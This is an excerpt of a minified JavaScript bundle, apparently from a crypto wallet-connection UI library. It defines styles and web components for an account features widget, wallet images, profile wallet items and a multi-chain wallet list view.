  wui-promo + wui-profile-button {
    margin-top: ${({spacing:t})=>t[4]};
  }

  wui-tabs {
    width: 100%;
  }

  .contentContainer {
    height: 280px;
  }

  .contentContainer > wui-icon-box {
    width: 40px;
    height: 40px;
    border-radius: ${({borderRadius:t})=>t[3]};
  }

  .contentContainer > .textContent {
    width: 65%;
  }
`;var qu=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Ja=class extends $e{constructor(){super(...arguments),this.unsubscribe=[],this.network=Y.state.activeCaipNetwork,this.profileName=Y.getAccountData()?.profileName,this.address=Y.getAccountData()?.address,this.currentTab=Y.getAccountData()?.currentTab,this.tokenBalance=Y.getAccountData()?.tokenBalance,this.features=de.state.features,this.namespace=Y.state.activeChain,this.activeConnectorIds=Ce.state.activeConnectorIds,this.remoteFeatures=de.state.remoteFeatures}firstUpdated(){Y.fetchTokenBalance(),this.unsubscribe.push(Y.subscribeChainProp("accountState",e=>{e?.address?(this.address=e.address,this.profileName=e.profileName,this.currentTab=e.currentTab,this.tokenBalance=e.tokenBalance):kt.close()}),Ce.subscribeKey("activeConnectorIds",e=>{this.activeConnectorIds=e}),Y.subscribeKey("activeChain",e=>this.namespace=e),Y.subscribeKey("activeCaipNetwork",e=>this.network=e),de.subscribeKey("features",e=>this.features=e),de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e)),this.watchSwapValues()}disconnectedCallback(){this.unsubscribe.forEach(e=>e()),clearInterval(this.watchTokenBalance)}render(){if(!this.address)throw new Error("w3m-account-features-widget: No account provided");if(!this.namespace)return null;const e=this.activeConnectorIds[this.namespace],n=e?Ce.getConnectorById(e):void 0,{icon:r,iconSize:i}=this.getAuthData();return X`<wui-flex
      flexDirection="column"
      .padding=${["0","3","4","3"]}
      alignItems="center"
      gap="4"
      data-testid="w3m-account-wallet-features-widget"
    >
      <wui-flex flexDirection="column" justifyContent="center" alignItems="center" gap="2">
        <wui-wallet-switch
          profileName=${this.profileName}
          address=${this.address}
          icon=${r}
          iconSize=${i}
          alt=${n?.name}
          @click=${this.onGoToProfileWalletsView.bind(this)}
          data-testid="wui-wallet-switch"
        ></wui-wallet-switch>

        ${this.tokenBalanceTemplate()}
      </wui-flex>
      ${this.orderedWalletFeatures()} ${this.tabsTemplate()} ${this.listContentTemplate()}
    </wui-flex>`}orderedWalletFeatures(){const e=this.features?.walletFeaturesOrder||jt.DEFAULT_FEATURES.walletFeaturesOrder;if(e.every(s=>s==="send"||s==="receive"?!this.features?.[s]:s==="swaps"||s==="onramp"?!this.remoteFeatures?.[s]:!0))return null;const r=e.map(s=>s==="receive"||s==="onramp"?"fund":s),i=[...new Set(r)];return X`<wui-flex gap="2">
      ${i.map(s=>{switch(s){case"fund":return this.fundWalletTemplate();case"swaps":return this.swapsTemplate();case"send":return this.sendTemplate();default:return null}})}
    </wui-flex>`}fundWalletTemplate(){if(!this.namespace)return null;const e=jt.ONRAMP_SUPPORTED_CHAIN_NAMESPACES.includes(this.namespace),n=this.features?.receive,r=this.remoteFeatures?.onramp&&e,i=Hi.isPayWithExchangeEnabled();return!r&&!n&&!i?null:X`
      <w3m-tooltip-trigger text="Fund wallet">
        <wui-button
          data-testid="wallet-features-fund-wallet-button"
          @click=${this.onFundWalletClick.bind(this)}
          variant="accent-secondary"
          size="lg"
          fullWidth
        >
          <wui-icon name="dollar"></wui-icon>
        </wui-button>
      </w3m-tooltip-trigger>
    `}swapsTemplate(){const e=this.remoteFeatures?.swaps,n=Y.state.activeChain===ge.CHAIN.EVM;return!e||!n?null:X`
      <w3m-tooltip-trigger text="Swap">
        <wui-button
          fullWidth
          data-testid="wallet-features-swaps-button"
          @click=${this.onSwapClick.bind(this)}
          variant="accent-secondary"
          size="lg"
        >
          <wui-icon name="recycleHorizontal"></wui-icon>
        </wui-button>
      </w3m-tooltip-trigger>
    `}sendTemplate(){const e=this.features?.send,n=Y.state.activeChain,r=jt.SEND_SUPPORTED_NAMESPACES.includes(n);return!e||!r?null:X`
      <w3m-tooltip-trigger text="Send">
        <wui-button
          fullWidth
          data-testid="wallet-features-send-button"
          @click=${this.onSendClick.bind(this)}
          variant="accent-secondary"
          size="lg"
        >
          <wui-icon name="send"></wui-icon>
        </wui-button>
      </w3m-tooltip-trigger>
    `}watchSwapValues(){this.watchTokenBalance=setInterval(()=>Y.fetchTokenBalance(e=>this.onTokenBalanceError(e)),1e4)}onTokenBalanceError(e){e instanceof Error&&e.cause instanceof Response&&e.cause.status===ge.HTTP_STATUS_CODES.SERVICE_UNAVAILABLE&&clearInterval(this.watchTokenBalance)}listContentTemplate(){return this.currentTab===0?X`<w3m-account-tokens-widget></w3m-account-tokens-widget>`:this.currentTab===1?X`<w3m-account-activity-widget></w3m-account-activity-widget>`:X`<w3m-account-tokens-widget></w3m-account-tokens-widget>`}tokenBalanceTemplate(){if(this.tokenBalance&&this.tokenBalance?.length>=0){const e=xe.calculateBalance(this.tokenBalance),{dollars:n="0",pennies:r="00"}=xe.formatTokenBalance(e);return X`<wui-balance dollars=${n} pennies=${r}></wui-balance>`}return X`<wui-balance dollars="0" pennies="00"></wui-balance>`}tabsTemplate(){const e=s1.getTabsByNamespace(Y.state.activeChain);return e.length===0?null:X`<wui-tabs
      .onTabChange=${this.onTabChange.bind(this)}
      .activeTab=${this.currentTab}
      .tabs=${e}
    ></wui-tabs>`}onTabChange(e){Y.setAccountProp("currentTab",e,this.namespace)}onFundWalletClick(){we.push("FundWallet")}onSwapClick(){this.network?.caipNetworkId&&!jt.SWAP_SUPPORTED_NETWORKS.includes(this.network?.caipNetworkId)?we.push("UnsupportedChain",{swapUnsupportedChain:!0}):(tt.sendEvent({type:"track",event:"OPEN_SWAP",properties:{network:this.network?.caipNetworkId||"",isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),we.push("Swap"))}getAuthData(){const e=Be.getConnectedSocialProvider(),n=Be.getConnectedSocialUsername(),i=Ce.getAuthConnector()?.provider.getEmail()??"";return{name:Va.getAuthName({email:i,socialUsername:n,socialProvider:e}),icon:e??"mail",iconSize:e?"xl":"md"}}onGoToProfileWalletsView(){we.push("ProfileWallets")}onSendClick(){tt.sendEvent({type:"track",event:"OPEN_SEND",properties:{network:this.network?.caipNetworkId||"",isSmartAccount:Zr(Y.state.activeChain)===Xn.ACCOUNT_TYPES.SMART_ACCOUNT}}),we.push("WalletSend")}};Ja.styles=Qke;qu([Ee()],Ja.prototype,"watchTokenBalance",void 0);qu([Ee()],Ja.prototype,"network",void 0);qu([Ee()],Ja.prototype,"profileName",void 0);qu([Ee()],Ja.prototype,"address",void 0);qu([Ee()],Ja.prototype,"currentTab",void 0);qu([Ee()],Ja.prototype,"tokenBalance",void 0);qu([Ee()],Ja.prototype,"features",void 0);qu([Ee()],Ja.prototype,"namespace",void 0);qu([Ee()],Ja.prototype,"activeConnectorIds",void 0);qu([Ee()],Ja.prototype,"remoteFeatures",void 0);Ja=qu([Ue("w3m-account-wallet-features-widget")],Ja);var Mae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Zx=class extends $e{constructor(){super(),this.unsubscribe=[],this.namespace=Y.state.activeChain,this.unsubscribe.push(Y.subscribeKey("activeChain",e=>{this.namespace=e}))}render(){if(!this.namespace)return null;const e=Ce.getConnectorId(this.namespace),n=Ce.getAuthConnector();return X`
      ${n&&e===ge.CONNECTOR_ID.AUTH?this.walletFeaturesTemplate():this.defaultTemplate()}
    `}walletFeaturesTemplate(){return X`<w3m-account-wallet-features-widget></w3m-account-wallet-features-widget>`}defaultTemplate(){return X`<w3m-account-default-widget></w3m-account-default-widget>`}};Mae([Ee()],Zx.prototype,"namespace",void 0);Zx=Mae([Ue("w3m-account-view")],Zx);const Jke=ot`
  :host {
    position: relative;
    background-color: ${({tokens:t})=>t.theme.foregroundTertiary};
    display: flex;
    justify-content: center;
    align-items: center;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host([data-image='true']) {
    background-color: transparent;
  }

  :host > wui-flex {
    overflow: hidden;
    border-radius: inherit;
    border-radius: var(--local-border-radius);
  }

  :host([data-size='sm']) {
    width: 32px;
    height: 32px;
  }

  :host([data-size='md']) {
    width: 40px;
    height: 40px;
  }

  :host([data-size='lg']) {
    width: 56px;
    height: 56px;
  }

  :host([name='Extension'])::after {
    border: 1px solid ${({colors:t})=>t.accent010};
  }

  :host([data-wallet-icon='allWallets'])::after {
    border: 1px solid ${({colors:t})=>t.accent010};
  }

  wui-icon[data-parent-size='inherit'] {
    width: 75%;
    height: 75%;
    align-items: center;
  }

  wui-icon[data-parent-size='sm'] {
    width: 32px;
    height: 32px;
  }

  wui-icon[data-parent-size='md'] {
    width: 40px;
    height: 40px;
  }

  :host > wui-icon-box {
    position: absolute;
    overflow: hidden;
    right: -1px;
    bottom: -2px;
    z-index: 1;
    border: 2px solid ${({tokens:t})=>t.theme.backgroundPrimary};
    padding: 1px;
  }
`;var Zg=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Mf=class extends $e{constructor(){super(...arguments),this.size="md",this.name="",this.installed=!1,this.badgeSize="xs"}render(){let e="1";return this.size==="lg"?e="4":this.size==="md"?e="2":this.size==="sm"&&(e="1"),this.style.cssText=`
       --local-border-radius: var(--apkt-borderRadius-${e});
   `,this.dataset.size=this.size,this.imageSrc&&(this.dataset.image="true"),this.walletIcon&&(this.dataset.walletIcon=this.walletIcon),X`
      <wui-flex justifyContent="center" alignItems="center"> ${this.templateVisual()} </wui-flex>
    `}templateVisual(){return this.imageSrc?X`<wui-image src=${this.imageSrc} alt=${this.name}></wui-image>`:this.walletIcon?X`<wui-icon size="md" color="default" name=${this.walletIcon}></wui-icon>`:X`<wui-icon
      data-parent-size=${this.size}
      size="inherit"
      color="inherit"
      name="wallet"
    ></wui-icon>`}};Mf.styles=[Dt,Jke];Zg([ie()],Mf.prototype,"size",void 0);Zg([ie()],Mf.prototype,"name",void 0);Zg([ie()],Mf.prototype,"imageSrc",void 0);Zg([ie()],Mf.prototype,"walletIcon",void 0);Zg([ie({type:Boolean})],Mf.prototype,"installed",void 0);Zg([ie()],Mf.prototype,"badgeSize",void 0);Mf=Zg([Ue("wui-wallet-image")],Mf);const Xke=ot`
  wui-image {
    width: 24px;
    height: 24px;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  wui-image,
  .icon-box {
    width: 32px;
    height: 32px;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  wui-icon:not(.custom-icon, .icon-badge) {
    cursor: pointer;
  }

  .icon-box {
    position: relative;
    border-radius: ${({borderRadius:t})=>t[2]};
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  .icon-badge {
    position: absolute;
    top: 18px;
    left: 23px;
    z-index: 3;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border: 2px solid ${({tokens:t})=>t.theme.backgroundPrimary};
    border-radius: 50%;
    padding: ${({spacing:t})=>t["01"]};
  }

  .icon-badge {
    width: 8px;
    height: 8px;
  }
`;var la=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Ys=class extends $e{constructor(){super(...arguments),this.address="",this.profileName="",this.content=[],this.alt="",this.imageSrc="",this.icon=void 0,this.iconSize="md",this.iconBadge=void 0,this.iconBadgeSize="md",this.buttonVariant="neutral-primary",this.enableMoreButton=!1,this.charsStart=4,this.charsEnd=6}render(){return X`
      <wui-flex flexDirection="column" rowgap="2">
        ${this.topTemplate()} ${this.bottomTemplate()}
      </wui-flex>
    `}topTemplate(){return X`
      <wui-flex alignItems="flex-start" justifyContent="space-between">
        ${this.imageOrIconTemplate()}
        <wui-icon-link
          variant="secondary"
          size="md"
          icon="copy"
          @click=${this.dispatchCopyEvent}
        ></wui-icon-link>
        <wui-icon-link
          variant="secondary"
          size="md"
          icon="externalLink"
          @click=${this.dispatchExternalLinkEvent}
        ></wui-icon-link>
        ${this.enableMoreButton?X`<wui-icon-link
              variant="secondary"
              size="md"
              icon="threeDots"
              @click=${this.dispatchMoreButtonEvent}
              data-testid="wui-active-profile-wallet-item-more-button"
            ></wui-icon-link>`:null}
      </wui-flex>
    `}bottomTemplate(){return X` <wui-flex flexDirection="column">${this.contentTemplate()}</wui-flex> `}imageOrIconTemplate(){return this.icon?X`
        <wui-flex flexGrow="1" alignItems="center">
          <wui-flex alignItems="center" justifyContent="center" class="icon-box">
            <wui-icon size="lg" color="default" name=${this.icon} class="custom-icon"></wui-icon>

            ${this.iconBadge?X`<wui-icon
                  color="accent-primary"
                  size="inherit"
                  name=${this.iconBadge}
                  class="icon-badge"
                ></wui-icon>`:null}
          </wui-flex>
        </wui-flex>
      `:X`
      <wui-flex flexGrow="1" alignItems="center">
        <wui-image objectFit="contain" src=${this.imageSrc} alt=${this.alt}></wui-image>
      </wui-flex>
    `}contentTemplate(){return this.content.length===0?null:X`
      <wui-flex flexDirection="column" rowgap="3">
        ${this.content.map(e=>this.labelAndTagTemplate(e))}
      </wui-flex>
    `}labelAndTagTemplate({address:e,profileName:n,label:r,description:i,enableButton:s,buttonType:o,buttonLabel:a,buttonVariant:c,tagVariant:l,tagLabel:f,alignItems:h="flex-end"}){return X`
      <wui-flex justifyContent="space-between" alignItems=${h} columngap="1">
        <wui-flex flexDirection="column" rowgap="01">
          ${r?X`<wui-text variant="sm-medium" color="secondary">${r}</wui-text>`:null}

          <wui-flex alignItems="center" columngap="1">
            <wui-text variant="md-regular" color="primary">
              ${Cr.getTruncateString({string:n||e,charsStart:n?16:this.charsStart,charsEnd:n?0:this.charsEnd,truncate:n?"end":"middle"})}
            </wui-text>

            ${l&&f?X`<wui-tag variant=${l} size="sm">${f}</wui-tag>`:null}
          </wui-flex>

          ${i?X`<wui-text variant="sm-regular" color="secondary">${i}</wui-text>`:null}
        </wui-flex>

        ${s?this.buttonTemplate({buttonType:o,buttonLabel:a,buttonVariant:c}):null}
      </wui-flex>
    `}buttonTemplate({buttonType:e,buttonLabel:n,buttonVariant:r}){return X`
      <wui-button
        size="sm"
        variant=${r}
        @click=${e==="disconnect"?this.dispatchDisconnectEvent.bind(this):this.dispatchSwitchEvent.bind(this)}
        data-testid=${e==="disconnect"?"wui-active-profile-wallet-item-disconnect-button":"wui-active-profile-wallet-item-switch-button"}
      >
        ${n}
      </wui-button>
    `}dispatchDisconnectEvent(){this.dispatchEvent(new CustomEvent("disconnect",{bubbles:!0,composed:!0}))}dispatchSwitchEvent(){this.dispatchEvent(new CustomEvent("switch",{bubbles:!0,composed:!0}))}dispatchExternalLinkEvent(){this.dispatchEvent(new CustomEvent("externalLink",{bubbles:!0,composed:!0}))}dispatchMoreButtonEvent(){this.dispatchEvent(new CustomEvent("more",{bubbles:!0,composed:!0}))}dispatchCopyEvent(){this.dispatchEvent(new CustomEvent("copy",{bubbles:!0,composed:!0}))}};Ys.styles=[Dt,nr,Xke];la([ie()],Ys.prototype,"address",void 0);la([ie()],Ys.prototype,"profileName",void 0);la([ie({type:Array})],Ys.prototype,"content",void 0);la([ie()],Ys.prototype,"alt",void 0);la([ie()],Ys.prototype,"imageSrc",void 0);la([ie()],Ys.prototype,"icon",void 0);la([ie()],Ys.prototype,"iconSize",void 0);la([ie()],Ys.prototype,"iconBadge",void 0);la([ie()],Ys.prototype,"iconBadgeSize",void 0);la([ie()],Ys.prototype,"buttonVariant",void 0);la([ie({type:Boolean})],Ys.prototype,"enableMoreButton",void 0);la([ie({type:Number})],Ys.prototype,"charsStart",void 0);la([ie({type:Number})],Ys.prototype,"charsEnd",void 0);Ys=la([Ue("wui-active-profile-wallet-item")],Ys);const e7e=ot`
  wui-image,
  .icon-box {
    width: 32px;
    height: 32px;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  .right-icon {
    cursor: pointer;
  }

  .icon-box {
    position: relative;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  .icon-badge {
    position: absolute;
    top: 18px;
    left: 23px;
    z-index: 3;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border: 2px solid ${({tokens:t})=>t.theme.backgroundPrimary};
    border-radius: 50%;
    padding: ${({spacing:t})=>t["01"]};
  }

  .icon-badge {
    width: 8px;
    height: 8px;
  }
`;var Xs=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let is=class extends $e{constructor(){super(...arguments),this.address="",this.profileName="",this.alt="",this.buttonLabel="",this.buttonVariant="accent-primary",this.imageSrc="",this.icon=void 0,this.iconSize="md",this.iconBadgeSize="md",this.rightIcon="signOut",this.rightIconSize="md",this.loading=!1,this.charsStart=4,this.charsEnd=6}render(){return X`
      <wui-flex alignItems="center" columngap="2">
        ${this.imageOrIconTemplate()} ${this.labelAndDescriptionTemplate()}
        ${this.buttonActionTemplate()}
      </wui-flex>
    `}imageOrIconTemplate(){return this.icon?X`
        <wui-flex alignItems="center" justifyContent="center" class="icon-box">
          <wui-flex alignItems="center" justifyContent="center" class="icon-box">
            <wui-icon size="lg" color="default" name=${this.icon} class="custom-icon"></wui-icon>

            ${this.iconBadge?X`<wui-icon
                  color="default"
                  size="inherit"
                  name=${this.iconBadge}
                  class="icon-badge"
                ></wui-icon>`:null}
          </wui-flex>
        </wui-flex>
      `:X`<wui-image objectFit="contain" src=${this.imageSrc} alt=${this.alt}></wui-image>`}labelAndDescriptionTemplate(){return X`
      <wui-flex
        flexDirection="column"
        flexGrow="1"
        justifyContent="flex-start"
        alignItems="flex-start"
      >
        <wui-text variant="lg-regular" color="primary">
          ${Cr.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?16:this.charsStart,charsEnd:this.profileName?0:this.charsEnd,truncate:this.profileName?"end":"middle"})}
        </wui-text>
      </wui-flex>
    `}buttonActionTemplate(){return X`
      <wui-flex columngap="1" alignItems="center" justifyContent="center">
        <wui-button
          size="sm"
          variant=${this.buttonVariant}
          .loading=${this.loading}
          @click=${this.handleButtonClick}
          data-testid="wui-inactive-profile-wallet-item-button"
        >
          ${this.buttonLabel}
        </wui-button>

        <wui-icon-link
          variant="secondary"
          size="md"
          icon=${et(this.rightIcon)}
          class="right-icon"
          @click=${this.handleIconClick}
        ></wui-icon-link>
      </wui-flex>
    `}handleButtonClick(){this.dispatchEvent(new CustomEvent("buttonClick",{bubbles:!0,composed:!0}))}handleIconClick(){this.dispatchEvent(new CustomEvent("iconClick",{bubbles:!0,composed:!0}))}};is.styles=[Dt,nr,e7e];Xs([ie()],is.prototype,"address",void 0);Xs([ie()],is.prototype,"profileName",void 0);Xs([ie()],is.prototype,"alt",void 0);Xs([ie()],is.prototype,"buttonLabel",void 0);Xs([ie()],is.prototype,"buttonVariant",void 0);Xs([ie()],is.prototype,"imageSrc",void 0);Xs([ie()],is.prototype,"icon",void 0);Xs([ie()],is.prototype,"iconSize",void 0);Xs([ie()],is.prototype,"iconBadge",void 0);Xs([ie()],is.prototype,"iconBadgeSize",void 0);Xs([ie()],is.prototype,"rightIcon",void 0);Xs([ie()],is.prototype,"rightIconSize",void 0);Xs([ie({type:Boolean})],is.prototype,"loading",void 0);Xs([ie({type:Number})],is.prototype,"charsStart",void 0);Xs([ie({type:Number})],is.prototype,"charsEnd",void 0);is=Xs([Ue("wui-inactive-profile-wallet-item")],is);const t7e=ot`
  :host {
    position: relative;
    display: flex;
    width: 100%;
    height: 1px;
    background-color: ${({tokens:t})=>t.theme.borderPrimary};
    justify-content: center;
    align-items: center;
  }

  :host > wui-text {
    position: absolute;
    padding: 0px 8px;
    background-color: ${({tokens:t})=>t.theme.backgroundPrimary};
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color;
  }
`;var Uae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Yx=class extends $e{constructor(){super(...arguments),this.text=""}render(){return X`${this.template()}`}template(){return this.text?X`<wui-text variant="md-regular" color="secondary">${this.text}</wui-text>`:null}};Yx.styles=[Dt,t7e];Uae([ie()],Yx.prototype,"text",void 0);Yx=Uae([Ue("wui-separator")],Yx);const q9={getAuthData(t){const e=t.connectorId===ge.CONNECTOR_ID.AUTH;if(!e)return{isAuth:!1,icon:void 0,iconSize:void 0,name:void 0};const n=t?.auth?.name??Be.getConnectedSocialProvider(),r=t?.auth?.username??Be.getConnectedSocialUsername(),s=Ce.getAuthConnector()?.provider.getEmail()??"";return{isAuth:!0,icon:n??"mail",iconSize:n?"xl":"md",name:e?Va.getAuthName({email:s,socialUsername:r,socialProvider:n}):void 0}}},n7e=ot`
  :host {
    --connect-scroll--top-opacity: 0;
    --connect-scroll--bottom-opacity: 0;
  }

  .balance-amount {
    flex: 1;
  }

  .wallet-list {
    scrollbar-width: none;
    overflow-y: scroll;
    overflow-x: hidden;
    transition: opacity ${({easings:t})=>t["ease-out-power-1"]}
      ${({durations:t})=>t.md};
    will-change: opacity;
    mask-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, calc(1 - var(--connect-scroll--top-opacity))) 0px,
      rgba(200, 200, 200, calc(1 - var(--connect-scroll--top-opacity))) 1px,
      black 40px,
      black calc(100% - 40px),
      rgba(155, 155, 155, calc(1 - var(--connect-scroll--bottom-opacity))) calc(100% - 1px),
      rgba(0, 0, 0, calc(1 - var(--connect-scroll--bottom-opacity))) 100%
    );
  }

  .active-wallets {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  .active-wallets-box {
    height: 330px;
  }

  .empty-wallet-list-box {
    height: 400px;
  }

  .empty-box {
    width: 100%;
    padding: ${({spacing:t})=>t[4]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-separator {
    margin: ${({spacing:t})=>t[2]} 0 ${({spacing:t})=>t[2]} 0;
  }

  .active-connection {
    padding: ${({spacing:t})=>t[2]};
  }

  .recent-connection {
    padding: ${({spacing:t})=>t[2]} 0 ${({spacing:t})=>t[2]} 0;
  }

  @media (max-width: 430px) {
    .active-wallets-box,
    .empty-wallet-list-box {
      height: auto;
      max-height: clamp(360px, 470px, 80vh);
    }
  }
`;var tc=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const Cc={ADDRESS_DISPLAY:{START:4,END:6},BADGE:{SIZE:"md",ICON:"lightbulb"},SCROLL_THRESHOLD:50,OPACITY_RANGE:[0,1]},Gb={eip155:"ethereum",solana:"solana",bip122:"bitcoin",ton:"ton"},r7e=[{namespace:"eip155",icon:Gb.eip155,label:"EVM"},{namespace:"solana",icon:Gb.solana,label:"Solana"},{namespace:"bip122",icon:Gb.bip122,label:"Bitcoin"},{namespace:"ton",icon:Gb.ton,label:"Ton"}],i7e={eip155:{title:"Add EVM Wallet",description:"Add your first EVM wallet"},solana:{title:"Add Solana Wallet",description:"Add your first Solana wallet"},bip122:{title:"Add Bitcoin Wallet",description:"Add your first Bitcoin wallet"},ton:{title:"Add TON Wallet",description:"Add your first TON wallet"}};let Qs=class extends $e{constructor(){super(),this.unsubscribers=[],this.currentTab=0,this.namespace=Y.state.activeChain,this.namespaces=Array.from(Y.state.chains.keys()),this.caipAddress=void 0,this.profileName=void 0,this.activeConnectorIds=Ce.state.activeConnectorIds,this.lastSelectedAddress="",this.lastSelectedConnectorId="",this.isSwitching=!1,this.caipNetwork=Y.state.activeCaipNetwork,this.user=Y.getAccountData()?.user,this.remoteFeatures=de.state.remoteFeatures,this.currentTab=this.namespace?this.namespaces.indexOf(this.namespace):0,this.caipAddress=Y.getAccountData(this.namespace)?.caipAddress,this.profileName=Y.getAccountData(this.namespace)?.profileName,this.unsubscribers.push(ke.subscribeKey("connections",()=>this.onConnectionsChange()),ke.subscribeKey("recentConnections",()=>this.requestUpdate()),Ce.subscribeKey("activeConnectorIds",e=>{this.activeConnectorIds=e}),Y.subscribeKey("activeCaipNetwork",e=>this.caipNetwork=e),Y.subscribeChainProp("accountState",e=>{this.user=e?.user}),de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e)),this.chainListener=Y.subscribeChainProp("accountState",e=>{this.caipAddress=e?.caipAddress,this.profileName=e?.profileName},this.namespace)}disconnectedCallback(){this.unsubscribers.forEach(e=>e()),this.resizeObserver?.disconnect(),this.removeScrollListener(),this.chainListener?.()}firstUpdated(){const e=this.shadowRoot?.querySelector(".wallet-list");if(!e)return;const n=()=>this.updateScrollOpacity(e);requestAnimationFrame(n),e.addEventListener("scroll",n),this.resizeObserver=new ResizeObserver(n),this.resizeObserver.observe(e),n()}render(){const e=this.namespace;if(!e)throw new Error("Namespace is not set");return X`
      <wui-flex flexDirection="column" .padding=${["0","4","4","4"]} gap="4">
        ${this.renderTabs()} ${this.renderHeader(e)} ${this.renderConnections(e)}
        ${this.renderAddConnectionButton(e)}
      </wui-flex>
    `}renderTabs(){const e=r7e.filter(r=>this.namespaces.includes(r.namespace));return e.length>1?X`
        <wui-tabs
          .onTabChange=${r=>this.handleTabChange(r)}
          .activeTab=${this.currentTab}
          .tabs=${e}
        ></wui-tabs>
      `:null}renderHeader(e){const r=this.getActiveConnections(e).flatMap(({accounts:i})=>i).length+(this.caipAddress?1:0);return X`
      <wui-flex alignItems="center" columngap="1">
        <wui-icon
          size="sm"
          name=${Gb[e]??Gb.eip155}
        ></wui-icon>
        <wui-text color="secondary" variant="lg-regular"
          >${r>1?"Wallets":"Wallet"}</wui-text
        >
        <wui-text
          color="primary"
          variant="lg-regular"
          class="balance-amount"
          data-testid="balance-amount"
        >
          ${r}
        </wui-text>
        <wui-link
          color="secondary"
          variant="secondary"
          @click=${()=>ke.disconnect({namespace:e})}
          ?disabled=${!this.hasAnyConnections(e)}
          data-testid="disconnect-all-button"
        >
          Disconnect All
        </wui-link>
      </wui-flex>
    `}renderConnections(e){const n=this.hasAnyConnections(e);return X`
      <wui-flex flexDirection="column" class=${JB({"wallet-list":!0,"active-wallets-box":n,"empty-wallet-list-box":!n})} rowgap="3">
        ${n?this.renderActiveConnections(e):this.renderEmptyState(e)}
      </wui-flex>
    `}renderActiveConnections(e){const n=this.getActiveConnections(e),r=this.activeConnectorIds[e],i=this.getPlainAddress();return X`
      ${i||r||n.length>0?X`<wui-flex
            flexDirection="column"
            .padding=${["4","0","4","0"]}
            class="active-wallets"
          >
            ${this.renderActiveProfile(e)} ${this.renderActiveConnectionsList(e)}
          </wui-flex>`:null}
      ${this.renderRecentConnections(e)}
    `}renderActiveProfile(e){const n=this.activeConnectorIds[e];if(!n)return null;const{connections:r}=Dc.getConnectionsData(e),i=Ce.getConnectorById(n),s=er.getConnectorImage(i),o=this.getPlainAddress();if(!o)return null;const a=e===ge.CHAIN.BITCOIN,c=q9.getAuthData({connectorId:n,accounts:[]}),l=this.getActiveConnections(e).flatMap(m=>m.accounts).length>0,f=r.find(m=>m.connectorId===n),h=f?.accounts.filter(m=>!Gr.isLowerCaseMatch(m.address,o));return X`
      <wui-flex flexDirection="column" .padding=${["0","4","0","4"]}>
        <wui-active-profile-wallet-item
          address=${o}
          alt=${i?.name}
          .content=${this.getProfileContent({address:o,connections:r,connectorId:n,namespace:e})}
          .charsStart=${Cc.ADDRESS_DISPLAY.START}
          .charsEnd=${Cc.ADDRESS_DISPLAY.END}
          .icon=${c.icon}
          .iconSize=${c.iconSize}
          .iconBadge=${this.isSmartAccount(o)?Cc.BADGE.ICON:void 0}
          .iconBadgeSize=${this.isSmartAccount(o)?Cc.BADGE.SIZE:void 0}
          imageSrc=${s}
          ?enableMoreButton=${c.isAuth}
